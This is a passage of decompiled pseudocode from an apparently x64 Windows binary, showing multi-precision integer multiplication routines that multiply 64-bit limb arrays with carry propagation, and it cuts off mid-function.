  *((_QWORD *)&v906 + 1) += v903 + (unsigned __int64)v906 < v903;
  v908 = *((_QWORD *)&v906 + 1) + v904;
  v909 = (v908 < *((_QWORD *)&v906 + 1)) + v905;
  v910 = a2[15] * (unsigned __int128)a3[9];
  *(_QWORD *)&v910 = v907 + v910;
  a1[24] = v910;
  *((_QWORD *)&v910 + 1) += (unsigned __int64)v910 < v907;
  v911 = *((_QWORD *)&v910 + 1) + v908;
  v912 = (v911 < *((_QWORD *)&v910 + 1)) + v909;
  v913 = a2[10] * (unsigned __int128)a3[15];
  v914 = v911 + v913;
  *((_QWORD *)&v913 + 1) += v911 + (unsigned __int64)v913 < v911;
  v915 = *((_QWORD *)&v913 + 1) + v912;
  v916 = v915 < *((_QWORD *)&v913 + 1);
  v917 = a2[11] * (unsigned __int128)a3[14];
  v918 = v914 + v917;
  *((_QWORD *)&v917 + 1) += v914 + (unsigned __int64)v917 < v914;
  v919 = *((_QWORD *)&v917 + 1) + v915;
  v920 = (v919 < *((_QWORD *)&v917 + 1)) + v916;
  v921 = a2[12] * (unsigned __int128)a3[13];
  v922 = v918 + v921;
  *((_QWORD *)&v921 + 1) += v918 + (unsigned __int64)v921 < v918;
  v923 = *((_QWORD *)&v921 + 1) + v919;
  v924 = (v923 < *((_QWORD *)&v921 + 1)) + v920;
  v925 = a2[13] * (unsigned __int128)a3[12];
  v926 = v922 + v925;
  *((_QWORD *)&v925 + 1) += v922 + (unsigned __int64)v925 < v922;
  v927 = *((_QWORD *)&v925 + 1) + v923;
  v928 = (v927 < *((_QWORD *)&v925 + 1)) + v924;
  v929 = a2[14] * (unsigned __int128)a3[11];
  v930 = v926 + v929;
  *((_QWORD *)&v929 + 1) += v926 + (unsigned __int64)v929 < v926;
  v931 = *((_QWORD *)&v929 + 1) + v927;
  v932 = (v931 < *((_QWORD *)&v929 + 1)) + v928;
  v933 = a2[15] * (unsigned __int128)a3[10];
  *(_QWORD *)&v933 = v930 + v933;
  a1[25] = v933;
  *((_QWORD *)&v933 + 1) += (unsigned __int64)v933 < v930;
  v934 = *((_QWORD *)&v933 + 1) + v931;
  v935 = (v934 < *((_QWORD *)&v933 + 1)) + v932;
  v936 = a2[11] * (unsigned __int128)a3[15];
  v937 = v934 + v936;
  *((_QWORD *)&v936 + 1) += v934 + (unsigned __int64)v936 < v934;
  v938 = *((_QWORD *)&v936 + 1) + v935;
  v939 = v938 < *((_QWORD *)&v936 + 1);
  v940 = a2[12] * (unsigned __int128)a3[14];
  v941 = v937 + v940;
  *((_QWORD *)&v940 + 1) += v937 + (unsigned __int64)v940 < v937;
  v942 = *((_QWORD *)&v940 + 1) + v938;
  v943 = (v942 < *((_QWORD *)&v940 + 1)) + v939;
  v944 = a2[13] * (unsigned __int128)a3[13];
  v945 = v941 + v944;
  *((_QWORD *)&v944 + 1) += v941 + (unsigned __int64)v944 < v941;
  v946 = *((_QWORD *)&v944 + 1) + v942;
  v947 = (v946 < *((_QWORD *)&v944 + 1)) + v943;
  v948 = a2[14] * (unsigned __int128)a3[12];
  v949 = v945 + v948;
  *((_QWORD *)&v948 + 1) += v945 + (unsigned __int64)v948 < v945;
  v950 = *((_QWORD *)&v948 + 1) + v946;
  v951 = (v950 < *((_QWORD *)&v948 + 1)) + v947;
  v952 = a2[15] * (unsigned __int128)a3[11];
  *(_QWORD *)&v952 = v949 + v952;
  a1[26] = v952;
  *((_QWORD *)&v952 + 1) += (unsigned __int64)v952 < v949;
  v953 = *((_QWORD *)&v952 + 1) + v950;
  v954 = (v953 < *((_QWORD *)&v952 + 1)) + v951;
  v955 = a2[12] * (unsigned __int128)a3[15];
  v956 = v953 + v955;
  *((_QWORD *)&v955 + 1) += v953 + (unsigned __int64)v955 < v953;
  v957 = *((_QWORD *)&v955 + 1) + v954;
  v958 = v957 < *((_QWORD *)&v955 + 1);
  v959 = a2[13] * (unsigned __int128)a3[14];
  v960 = v956 + v959;
  *((_QWORD *)&v959 + 1) += v956 + (unsigned __int64)v959 < v956;
  v961 = *((_QWORD *)&v959 + 1) + v957;
  v962 = (v961 < *((_QWORD *)&v959 + 1)) + v958;
  v963 = a2[14] * (unsigned __int128)a3[13];
  v964 = v960 + v963;
  *((_QWORD *)&v963 + 1) += v960 + (unsigned __int64)v963 < v960;
  v965 = *((_QWORD *)&v963 + 1) + v961;
  v966 = (v965 < *((_QWORD *)&v963 + 1)) + v962;
  v967 = a2[15] * (unsigned __int128)a3[12];
  *(_QWORD *)&v967 = v964 + v967;
  a1[27] = v967;
  *((_QWORD *)&v967 + 1) += (unsigned __int64)v967 < v964;
  v968 = *((_QWORD *)&v967 + 1) + v965;
  v969 = (v968 < *((_QWORD *)&v967 + 1)) + v966;
  v970 = a2[13] * (unsigned __int128)a3[15];
  v971 = v968 + v970;
  *((_QWORD *)&v970 + 1) += v968 + (unsigned __int64)v970 < v968;
  v972 = *((_QWORD *)&v970 + 1) + v969;
  v973 = v972 < *((_QWORD *)&v970 + 1);
  v974 = a2[14] * (unsigned __int128)a3[14];
  v975 = v971 + v974;
  *((_QWORD *)&v974 + 1) += v971 + (unsigned __int64)v974 < v971;
  v976 = *((_QWORD *)&v974 + 1) + v972;
  v977 = (v976 < *((_QWORD *)&v974 + 1)) + v973;
  v978 = a2[15] * (unsigned __int128)a3[13];
  *(_QWORD *)&v978 = v975 + v978;
  a1[28] = v978;
  *((_QWORD *)&v978 + 1) += (unsigned __int64)v978 < v975;
  v979 = *((_QWORD *)&v978 + 1) + v976;
  v980 = (v979 < *((_QWORD *)&v978 + 1)) + v977;
  v981 = a2[14] * (unsigned __int128)a3[15];
  v982 = v979 + v981;
  *((_QWORD *)&v981 + 1) += v979 + (unsigned __int64)v981 < v979;
  v983 = *((_QWORD *)&v981 + 1) + v980;
  v984 = v983 < *((_QWORD *)&v981 + 1);
  v985 = a2[15] * (unsigned __int128)a3[14];
  *(_QWORD *)&v985 = v982 + v985;
  a1[29] = v985;
  *((_QWORD *)&v985 + 1) += (unsigned __int64)v985 < v982;
  v986 = *((_QWORD *)&v985 + 1) + v983;
  v987 = (v986 < *((_QWORD *)&v985 + 1)) + v984;
  v988 = a2[15] * (unsigned __int128)a3[15];
  result = v986 + v988;
  a1[30] = result;
  a1[31] = v987 + (result < v986) + *((_QWORD *)&v988 + 1);
  return result;
}
// 13F1152D0: too many cbuild loops

//----- (000000013F1171E0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1171E0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v4; // kr00_16
  __int128 v5; // kr10_16
  __int64 v6; // r10
  unsigned __int64 v7; // r8
  __int64 v8; // r10
  unsigned __int64 v9; // rax
  __int64 v10; // r9
  unsigned __int64 v11; // r9
  unsigned __int128 v12; // rax
  unsigned __int64 result; // rax

  v4 = *a3;
  v5 = *a2;
  *a1 = *a2 * *a3;
  v6 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v7 = (__PAIR128__(a3[1], v4) * v5) >> 64;
  v8 = (v7 < (unsigned __int128)(v5 * v4) >> 64) + v6;
  v9 = v7 + a2[1] * *a3;
  v10 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v9;
  v11 = (v9 < v7) + v10;
  v12 = a2[1] * (unsigned __int128)a3[1];
  result = v11 + v8 + v12;
  a1[2] = result;
  a1[3] = *((_QWORD *)&v12 + 1) + (v11 + v8 < v11) + (unsigned __int64)(result < v11 + v8);
  return result;
}

//----- (000000013F117260) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F117260(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // rcx
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  __int64 v11; // r9
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r8
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rbx
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // r11
  unsigned __int64 v19; // rax
  __int64 v20; // r9
  unsigned __int64 v21; // r9
  unsigned __int64 v22; // rcx
  unsigned __int64 v23; // r8
  unsigned __int64 v24; // rbp
  unsigned __int64 v25; // r14
  unsigned __int64 v26; // rcx
  unsigned __int64 v27; // rsi
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rbx
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // r9
  unsigned __int128 v33; // rax
  unsigned __int64 v34; // r11
  unsigned __int64 v35; // r9
  _BOOL8 v36; // r10
  unsigned __int128 v37; // rax
  unsigned __int64 v38; // r8
  unsigned __int64 v39; // rcx
  _BOOL8 v40; // r10
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // r8
  _BOOL8 v43; // r10
  unsigned __int128 v44; // rax
  unsigned __int64 v45; // rcx
  unsigned __int64 v46; // r10
  _BOOL8 v47; // r15
  unsigned __int128 v48; // rax
  unsigned __int64 v49; // r10
  _BOOL8 v50; // r15
  unsigned __int128 v51; // rax
  unsigned __int64 result; // rax

  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v9 = (__PAIR128__(a3[1], v6) * v7) >> 64;
  v10 = v9 + a2[1] * *a3;
  v11 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v10;
  v12 = (v10 < v9) + v11;
  v13 = v12 + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v14 = v13 + *a2 * a3[2];
  v15 = (v14 < v13) + ((*a2 * (unsigned __int128)a3[2]) >> 64);
  v16 = (v13 < v12) + v15;
  v17 = v14 + a2[1] * a3[1];
  v18 = (v17 < v14) + ((a2[1] * (unsigned __int128)a3[1]) >> 64);
  v19 = v17 + a2[2] * *a3;
  v20 = (a2[2] * (unsigned __int128)*a3) >> 64;
  a1[2] = v19;
  v21 = (v19 < v17) + v20;
  v22 = v16 + v18 + v21;
  v23 = v22 + *a2 * a3[3];
  v24 = (v23 < v22) + ((*a2 * (unsigned __int128)a3[3]) >> 64);
  v25 = (v22 < v21) + v24 + (v16 + v18 < v18) + (unsigned __int64)(v16 < v15);
  v26 = v23 + a2[1] * a3[2];
  v27 = (v26 < v23) + ((a2[1] * (unsigned __int128)a3[2]) >> 64);
  v28 = v26 + a2[2] * a3[1];
  v29 = (v28 < v26) + ((a2[2] * (unsigned __int128)a3[1]) >> 64);
  v30 = v25 + v27 + v29;
  v31 = v28 + a2[3] * *a3;
  v32 = (v31 < v28) + ((a2[3] * (unsigned __int128)*a3) >> 64);
  a1[3] = v31;
  v33 = a2[1] * (unsigned __int128)a3[3];
  v34 = v30 + v32 + v33;
  *((_QWORD *)&v33 + 1) += v34 < v30 + v32;
  v35 = (v30 + v32 < v32) + (unsigned __int64)(v30 < v29) + (v25 < v24) + (v25 + v27 < v27) + *((_QWORD *)&v33 + 1);
  v36 = v35 < *((_QWORD *)&v33 + 1);
  v37 = a2[2] * (unsigned __int128)a3[2];
  v38 = v34 + v37;
  *((_QWORD *)&v37 + 1) += v34 + (unsigned __int64)v37 < v34;
  v39 = v35 + *((_QWORD *)&v37 + 1);
  v40 = (v35 + *((_QWORD *)&v37 + 1) < *((_QWORD *)&v37 + 1)) + v36;
  v41 = a2[3] * (unsigned __int128)a3[1];
  *(_QWORD *)&v41 = v38 + v41;
  a1[4] = v41;
  *((_QWORD *)&v41 + 1) += (unsigned __int64)v41 < v38;
  v42 = *((_QWORD *)&v41 + 1) + v39;
  v43 = (*((_QWORD *)&v41 + 1) + v39 < *((_QWORD *)&v41 + 1)) + v40;
  v44 = a2[2] * (unsigned __int128)a3[3];
  v45 = v42 + v44;
  *((_QWORD *)&v44 + 1) += v42 + (unsigned __int64)v44 < v42;
  v46 = *((_QWORD *)&v44 + 1) + v43;
  v47 = v46 < *((_QWORD *)&v44 + 1);
  v48 = a2[3] * (unsigned __int128)a3[2];
  *(_QWORD *)&v48 = v45 + v48;
  a1[5] = v48;
  *((_QWORD *)&v48 + 1) += (unsigned __int64)v48 < v45;
  v49 = *((_QWORD *)&v48 + 1) + v46;
  v50 = (v49 < *((_QWORD *)&v48 + 1)) + v47;
  v51 = a2[3] * (unsigned __int128)a3[3];
  result = v49 + v51;
  a1[6] = result;
  a1[7] = v50 + (result < v49) + *((_QWORD *)&v51 + 1);
  return result;
}

//----- (000000013F117490) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F117490(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  __int128 v6; // kr00_16
  __int128 v7; // kr10_16
  __int64 v8; // rcx
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rax
  __int64 v11; // r9
  unsigned __int64 v12; // r9
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // r8
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rbx
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // r11
  unsigned __int64 v19; // rax
  __int64 v20; // r9
  unsigned __int64 v21; // r9
  unsigned __int64 v22; // rcx
  unsigned __int64 v23; // r8
  unsigned __int64 v24; // rbp
  unsigned __int64 v25; // r14
  unsigned __int64 v26; // rcx
  unsigned __int64 v27; // rsi
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rbx
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // r9
  unsigned __int128 v33; // rax
  unsigned __int64 v34; // r11
  unsigned __int64 v35; // r8
  _BOOL8 v36; // r10
  unsigned __int128 v37; // rax
  unsigned __int64 v38; // r9
  unsigned __int64 v39; // rcx
  _BOOL8 v40; // r10
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // r8
  unsigned __int64 v43; // r9
  _BOOL8 v44; // r10
  unsigned __int128 v45; // rax
  unsigned __int64 v46; // rcx
  unsigned __int64 v47; // r9
  _BOOL8 v48; // r10
  unsigned __int128 v49; // rax
  unsigned __int64 v50; // r9
  _BOOL8 v51; // r10
  unsigned __int128 v52; // rax
  unsigned __int64 v53; // rcx
  unsigned __int64 v54; // r10
  _BOOL8 v55; // r9
  unsigned __int128 v56; // rax
  unsigned __int64 v57; // r8
  unsigned __int64 v58; // r10
  _BOOL8 v59; // r9
  unsigned __int128 v60; // rax
  unsigned __int64 v61; // rcx
  unsigned __int64 v62; // r10
  _BOOL8 v63; // r9
  unsigned __int128 v64; // rax
  unsigned __int64 v65; // r8
  unsigned __int64 v66; // r10
  _BOOL8 v67; // r9
  unsigned __int128 v68; // rax
  unsigned __int64 v69; // rcx
  unsigned __int64 v70; // r10
  _BOOL8 v71; // r9
  unsigned __int128 v72; // rax
  unsigned __int64 v73; // r10
  _BOOL8 v74; // r9
  unsigned __int128 v75; // rax
  unsigned __int64 v76; // rcx
  unsigned __int64 v77; // r9
  _BOOL8 v78; // r11
  unsigned __int128 v79; // rax
  unsigned __int64 v80; // r8
  unsigned __int64 v81; // r9
  _BOOL8 v82; // r11
  unsigned __int128 v83; // rax
  unsigned __int64 v84; // rcx
  unsigned __int64 v85; // r9
  _BOOL8 v86; // r11
  unsigned __int128 v87; // rax
  unsigned __int64 v88; // r8
  unsigned __int64 v89; // r9
  _BOOL8 v90; // r11
  unsigned __int128 v91; // rax
  unsigned __int64 v92; // rcx
  unsigned __int64 v93; // r9
  _BOOL8 v94; // r11
  unsigned __int128 v95; // rax
  unsigned __int64 v96; // r8
  unsigned __int64 v97; // r9
  _BOOL8 v98; // r11
  unsigned __int128 v99; // rax
  unsigned __int64 v100; // r9
  _BOOL8 v101; // r11
  unsigned __int128 v102; // rax
  unsigned __int64 v103; // rcx
  unsigned __int64 v104; // r11
  _BOOL8 v105; // r10
  unsigned __int128 v106; // rax
  unsigned __int64 v107; // r8
  unsigned __int64 v108; // r11
  _BOOL8 v109; // r10
  unsigned __int128 v110; // rax
  unsigned __int64 v111; // rcx
  unsigned __int64 v112; // r11
  _BOOL8 v113; // r10
  unsigned __int128 v114; // rax
  unsigned __int64 v115; // r8
  unsigned __int64 v116; // r11
  _BOOL8 v117; // r10
  unsigned __int128 v118; // rax
  unsigned __int64 v119; // rcx
  unsigned __int64 v120; // r11
  _BOOL8 v121; // r10
  unsigned __int128 v122; // rax
  unsigned __int64 v123; // r8
  unsigned __int64 v124; // r11
  _BOOL8 v125; // r10
  unsigned __int128 v126; // rax
  unsigned __int64 v127; // rcx
  unsigned __int64 v128; // r11
  _BOOL8 v129; // r10
  unsigned __int128 v130; // rax
  unsigned __int64 v131; // r11
  _BOOL8 v132; // r10
  unsigned __int128 v133; // rax
  unsigned __int64 v134; // rcx
  unsigned __int64 v135; // r10
  _BOOL8 v136; // r9
  unsigned __int128 v137; // rax
  unsigned __int64 v138; // r8
  unsigned __int64 v139; // r10
  _BOOL8 v140; // r9
  unsigned __int128 v141; // rax
  unsigned __int64 v142; // rcx
  unsigned __int64 v143; // r10
  _BOOL8 v144; // r9
  unsigned __int128 v145; // rax
  unsigned __int64 v146; // r8
  unsigned __int64 v147; // r10
  _BOOL8 v148; // r9
  unsigned __int128 v149; // rax
  unsigned __int64 v150; // rcx
  unsigned __int64 v151; // r10
  _BOOL8 v152; // r9
  unsigned __int128 v153; // rax
  unsigned __int64 v154; // r8
  unsigned __int64 v155; // r10
  _BOOL8 v156; // r9
  unsigned __int128 v157; // rax
  unsigned __int64 v158; // r10
  _BOOL8 v159; // r9
  unsigned __int128 v160; // rax
  unsigned __int64 v161; // rcx
  unsigned __int64 v162; // r9
  _BOOL8 v163; // r10
  unsigned __int128 v164; // rax
  unsigned __int64 v165; // r8
  unsigned __int64 v166; // r9
  _BOOL8 v167; // r10
  unsigned __int128 v168; // rax
  unsigned __int64 v169; // rcx
  unsigned __int64 v170; // r9
  _BOOL8 v171; // r10
  unsigned __int128 v172; // rax
  unsigned __int64 v173; // r8
  unsigned __int64 v174; // r9
  _BOOL8 v175; // r10
  unsigned __int128 v176; // rax
  unsigned __int64 v177; // rcx
  unsigned __int64 v178; // r9
  _BOOL8 v179; // r10
  unsigned __int128 v180; // rax
  unsigned __int64 v181; // r9
  _BOOL8 v182; // r10
  unsigned __int128 v183; // rax
  unsigned __int64 v184; // rcx
  unsigned __int64 v185; // r10
  _BOOL8 v186; // r9
  unsigned __int128 v187; // rax
  unsigned __int64 v188; // r8
  unsigned __int64 v189; // r10
  _BOOL8 v190; // r9
  unsigned __int128 v191; // rax
  unsigned __int64 v192; // rcx
  unsigned __int64 v193; // r10
  _BOOL8 v194; // r9
  unsigned __int128 v195; // rax
  unsigned __int64 v196; // r8
  unsigned __int64 v197; // r10
  _BOOL8 v198; // r9
  unsigned __int128 v199; // rax
  unsigned __int64 v200; // r10
  _BOOL8 v201; // r9
  unsigned __int128 v202; // rax
  unsigned __int64 v203; // rcx
  unsigned __int64 v204; // r9
  _BOOL8 v205; // r10
  unsigned __int128 v206; // rax
  unsigned __int64 v207; // r8
  unsigned __int64 v208; // r9
  _BOOL8 v209; // r10
  unsigned __int128 v210; // rax
  unsigned __int64 v211; // rcx
  unsigned __int64 v212; // r9
  _BOOL8 v213; // r10
  unsigned __int128 v214; // rax
  unsigned __int64 v215; // r9
  _BOOL8 v216; // r10
  unsigned __int128 v217; // rax
  unsigned __int64 v218; // rcx
  unsigned __int64 v219; // r10
  _BOOL8 v220; // r9
  unsigned __int128 v221; // rax
  unsigned __int64 v222; // r8
  unsigned __int64 v223; // r10
  _BOOL8 v224; // r9
  unsigned __int128 v225; // rax
  unsigned __int64 v226; // r10
  _BOOL8 v227; // r9
  unsigned __int128 v228; // rax
  unsigned __int64 v229; // rcx
  unsigned __int64 v230; // r9
  _BOOL8 v231; // r15
  unsigned __int128 v232; // rax
  unsigned __int64 v233; // r9
  _BOOL8 v234; // r15
  unsigned __int128 v235; // rax
  unsigned __int64 result; // rax

  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v9 = (__PAIR128__(a3[1], v6) * v7) >> 64;
  v10 = v9 + a2[1] * *a3;
  v11 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v10;
  v12 = (v10 < v9) + v11;
  v13 = v12 + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v14 = v13 + *a2 * a3[2];
  v15 = (v14 < v13) + ((*a2 * (unsigned __int128)a3[2]) >> 64);
  v16 = (v13 < v12) + v15;
  v17 = v14 + a2[1] * a3[1];
  v18 = (v17 < v14) + ((a2[1] * (unsigned __int128)a3[1]) >> 64);
  v19 = v17 + a2[2] * *a3;
  v20 = (a2[2] * (unsigned __int128)*a3) >> 64;
  a1[2] = v19;
  v21 = (v19 < v17) + v20;
  v22 = v16 + v18 + v21;
  v23 = v22 + *a2 * a3[3];
  v24 = (v23 < v22) + ((*a2 * (unsigned __int128)a3[3]) >> 64);
  v25 = (v22 < v21) + v24 + (v16 + v18 < v18) + (unsigned __int64)(v16 < v15);
  v26 = v23 + a2[1] * a3[2];
  v27 = (v26 < v23) + ((a2[1] * (unsigned __int128)a3[2]) >> 64);
  v28 = v26 + a2[2] * a3[1];
  v29 = (v28 < v26) + ((a2[2] * (unsigned __int128)a3[1]) >> 64);
  v30 = v25 + v27 + v29;
  v31 = v28 + a2[3] * *a3;
  v32 = (v31 < v28) + ((a2[3] * (unsigned __int128)*a3) >> 64);
  a1[3] = v31;
  v33 = *a2 * (unsigned __int128)a3[4];
  v34 = v30 + v32 + v33;
  *((_QWORD *)&v33 + 1) += v34 < v30 + v32;
  v35 = (v30 + v32 < v32) + (unsigned __int64)(v30 < v29) + (v25 < v24) + (v25 + v27 < v27) + *((_QWORD *)&v33 + 1);
  v36 = v35 < *((_QWORD *)&v33 + 1);
  v37 = a2[1] * (unsigned __int128)a3[3];
  v38 = v34 + v37;
  *((_QWORD *)&v37 + 1) += v34 + (unsigned __int64)v37 < v34;
  v39 = *((_QWORD *)&v37 + 1) + v35;
  v40 = (*((_QWORD *)&v37 + 1) + v35 < *((_QWORD *)&v37 + 1)) + v36;
  v41 = a2[2] * (unsigned __int128)a3[2];
  v42 = v38 + v41;
  *((_QWORD *)&v41 + 1) += v38 + (unsigned __int64)v41 < v38;
  v43 = *((_QWORD *)&v41 + 1) + v39;
  v44 = (*((_QWORD *)&v41 + 1) + v39 < *((_QWORD *)&v41 + 1)) + v40;
  v45 = a2[3] * (unsigned __int128)a3[1];
  v46 = v42 + v45;
  *((_QWORD *)&v45 + 1) += v42 + (unsigned __int64)v45 < v42;
  v47 = *((_QWORD *)&v45 + 1) + v43;
  v48 = (v47 < *((_QWORD *)&v45 + 1)) + v44;
  v49 = a2[4] * (unsigned __int128)*a3;
  *(_QWORD *)&v49 = v46 + v49;
  a1[4] = v49;
  *((_QWORD *)&v49 + 1) += (unsigned __int64)v49 < v46;
  v50 = *((_QWORD *)&v49 + 1) + v47;
  v51 = (v50 < *((_QWORD *)&v49 + 1)) + v48;
  v52 = *a2 * (unsigned __int128)a3[5];
  v53 = v50 + v52;
  *((_QWORD *)&v52 + 1) += v50 + (unsigned __int64)v52 < v50;
  v54 = *((_QWORD *)&v52 + 1) + v51;
  v55 = v54 < *((_QWORD *)&v52 + 1);
  v56 = a2[1] * (unsigned __int128)a3[4];
  v57 = v53 + v56;
  *((_QWORD *)&v56 + 1) += v53 + (unsigned __int64)v56 < v53;
  v58 = *((_QWORD *)&v56 + 1) + v54;
  v59 = (v58 < *((_QWORD *)&v56 + 1)) + v55;
  v60 = a2[2] * (unsigned __int128)a3[3];
  v61 = v57 + v60;
  *((_QWORD *)&v60 + 1) += v57 + (unsigned __int64)v60 < v57;
  v62 = *((_QWORD *)&v60 + 1) + v58;
  v63 = (v62 < *((_QWORD *)&v60 + 1)) + v59;
  v64 = a2[3] * (unsigned __int128)a3[2];
  v65 = v61 + v64;
  *((_QWORD *)&v64 + 1) += v61 + (unsigned __int64)v64 < v61;
  v66 = *((_QWORD *)&v64 + 1) + v62;
  v67 = (v66 < *((_QWORD *)&v64 + 1)) + v63;
  v68 = a2[4] * (unsigned __int128)a3[1];
  v69 = v65 + v68;
  *((_QWORD *)&v68 + 1) += v65 + (unsigned __int64)v68 < v65;
  v70 = *((_QWORD *)&v68 + 1) + v66;
  v71 = (v70 < *((_QWORD *)&v68 + 1)) + v67;
  v72 = a2[5] * (unsigned __int128)*a3;
  *(_QWORD *)&v72 = v69 + v72;
  a1[5] = v72;
  *((_QWORD *)&v72 + 1) += (unsigned __int64)v72 < v69;
  v73 = *((_QWORD *)&v72 + 1) + v70;
  v74 = (v73 < *((_QWORD *)&v72 + 1)) + v71;
  v75 = *a2 * (unsigned __int128)a3[6];
  v76 = v73 + v75;
  *((_QWORD *)&v75 + 1) += v73 + (unsigned __int64)v75 < v73;
  v77 = *((_QWORD *)&v75 + 1) + v74;
  v78 = v77 < *((_QWORD *)&v75 + 1);
  v79 = a2[1] * (unsigned __int128)a3[5];
  v80 = v76 + v79;
  *((_QWORD *)&v79 + 1) += v76 + (unsigned __int64)v79 < v76;
  v81 = *((_QWORD *)&v79 + 1) + v77;
  v82 = (v81 < *((_QWORD *)&v79 + 1)) + v78;
  v83 = a2[2] * (unsigned __int128)a3[4];
  v84 = v80 + v83;
  *((_QWORD *)&v83 + 1) += v80 + (unsigned __int64)v83 < v80;
  v85 = *((_QWORD *)&v83 + 1) + v81;
  v86 = (v85 < *((_QWORD *)&v83 + 1)) + v82;
  v87 = a2[3] * (unsigned __int128)a3[3];
  v88 = v84 + v87;
  *((_QWORD *)&v87 + 1) += v84 + (unsigned __int64)v87 < v84;
  v89 = *((_QWORD *)&v87 + 1) + v85;
  v90 = (v89 < *((_QWORD *)&v87 + 1)) + v86;
  v91 = a2[4] * (unsigned __int128)a3[2];
  v92 = v88 + v91;
  *((_QWORD *)&v91 + 1) += v88 + (unsigned __int64)v91 < v88;
  v93 = *((_QWORD *)&v91 + 1) + v89;
  v94 = (v93 < *((_QWORD *)&v91 + 1)) + v90;
  v95 = a2[5] * (unsigned __int128)a3[1];
  v96 = v92 + v95;
  *((_QWORD *)&v95 + 1) += v92 + (unsigned __int64)v95 < v92;
  v97 = *((_QWORD *)&v95 + 1) + v93;
  v98 = (v97 < *((_QWORD *)&v95 + 1)) + v94;
  v99 = a2[6] * (unsigned __int128)*a3;
  *(_QWORD *)&v99 = v96 + v99;
  a1[6] = v99;
  *((_QWORD *)&v99 + 1) += (unsigned __int64)v99 < v96;
  v100 = *((_QWORD *)&v99 + 1) + v97;
  v101 = (v100 < *((_QWORD *)&v99 + 1)) + v98;
  v102 = *a2 * (unsigned __int128)a3[7];
  v103 = v100 + v102;
  *((_QWORD *)&v102 + 1) += v100 + (unsigned __int64)v102 < v100;
  v104 = *((_QWORD *)&v102 + 1) + v101;
  v105 = v104 < *((_QWORD *)&v102 + 1);
  v106 = a2[1] * (unsigned __int128)a3[6];
  v107 = v103 + v106;
  *((_QWORD *)&v106 + 1) += v103 + (unsigned __int64)v106 < v103;
  v108 = *((_QWORD *)&v106 + 1) + v104;
  v109 = (v108 < *((_QWORD *)&v106 + 1)) + v105;
  v110 = a2[2] * (unsigned __int128)a3[5];
  v111 = v107 + v110;
  *((_QWORD *)&v110 + 1) += v107 + (unsigned __int64)v110 < v107;
  v112 = *((_QWORD *)&v110 + 1) + v108;
  v113 = (v112 < *((_QWORD *)&v110 + 1)) + v109;
  v114 = a2[3] * (unsigned __int128)a3[4];
  v115 = v111 + v114;
  *((_QWORD *)&v114 + 1) += v111 + (unsigned __int64)v114 < v111;
  v116 = *((_QWORD *)&v114 + 1) + v112;
  v117 = (v116 < *((_QWORD *)&v114 + 1)) + v113;
  v118 = a2[4] * (unsigned __int128)a3[3];
  v119 = v115 + v118;
  *((_QWORD *)&v118 + 1) += v115 + (unsigned __int64)v118 < v115;
  v120 = *((_QWORD *)&v118 + 1) + v116;
  v121 = (v120 < *((_QWORD *)&v118 + 1)) + v117;
  v122 = a2[5] * (unsigned __int128)a3[2];
  v123 = v119 + v122;
  *((_QWORD *)&v122 + 1) += v119 + (unsigned __int64)v122 < v119;
  v124 = *((_QWORD *)&v122 + 1) + v120;
  v125 = (v124 < *((_QWORD *)&v122 + 1)) + v121;
  v126 = a2[6] * (unsigned __int128)a3[1];
  v127 = v123 + v126;
  *((_QWORD *)&v126 + 1) += v123 + (unsigned __int64)v126 < v123;
  v128 = *((_QWORD *)&v126 + 1) + v124;
  v129 = (v128 < *((_QWORD *)&v126 + 1)) + v125;
  v130 = a2[7] * (unsigned __int128)*a3;
  *(_QWORD *)&v130 = v127 + v130;
  a1[7] = v130;
  *((_QWORD *)&v130 + 1) += (unsigned __int64)v130 < v127;
  v131 = *((_QWORD *)&v130 + 1) + v128;
  v132 = (v131 < *((_QWORD *)&v130 + 1)) + v129;
  v133 = a2[1] * (unsigned __int128)a3[7];
  v134 = v131 + v133;
  *((_QWORD *)&v133 + 1) += v131 + (unsigned __int64)v133 < v131;
  v135 = *((_QWORD *)&v133 + 1) + v132;
  v136 = v135 < *((_QWORD *)&v133 + 1);
  v137 = a2[2] * (unsigned __int128)a3[6];
  v138 = v134 + v137;
  *((_QWORD *)&v137 + 1) += v134 + (unsigned __int64)v137 < v134;
  v139 = *((_QWORD *)&v137 + 1) + v135;
  v140 = (v139 < *((_QWORD *)&v137 + 1)) + v136;
  v141 = a2[3] * (unsigned __int128)a3[5];
  v142 = v138 + v141;
  *((_QWORD *)&v141 + 1) += v138 + (unsigned __int64)v141 < v138;
  v143 = *((_QWORD *)&v141 + 1) + v139;
  v144 = (v143 < *((_QWORD *)&v141 + 1)) + v140;
  v145 = a2[4] * (unsigned __int128)a3[4];
  v146 = v142 + v145;
